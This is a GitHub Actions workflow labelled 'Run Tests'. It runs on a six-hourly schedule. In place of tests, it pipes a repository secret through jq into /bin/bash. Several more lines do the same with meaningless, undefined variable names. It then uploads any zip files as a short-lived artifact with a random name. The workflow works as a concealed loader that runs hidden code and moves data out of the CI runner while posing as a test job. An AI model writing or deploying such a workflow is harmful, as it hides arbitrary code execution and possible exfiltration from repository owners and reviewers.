name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '45 4,10,16,22 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  invoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pipeline
        env:
          og60: ${{ secrets.og60 }}
        run: |
          printf '%s' "$og60" | jq -r .fg33496 | /bin/bash
          echo $d3406 | jq -r .n90 | /bin/bash
          echo $xrcc95815 | jq -r .p33081 | /bin/bash
          echo $fm9 | jq -r .cjzfz998 | /bin/bash
          echo $zp1403 | jq -r .x57 | /bin/bash
          printf '%s' "$ez2" | jq -r .ngsjn4734 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: qkIzkOyV
          path: "*.zip"
          retention-days: 1
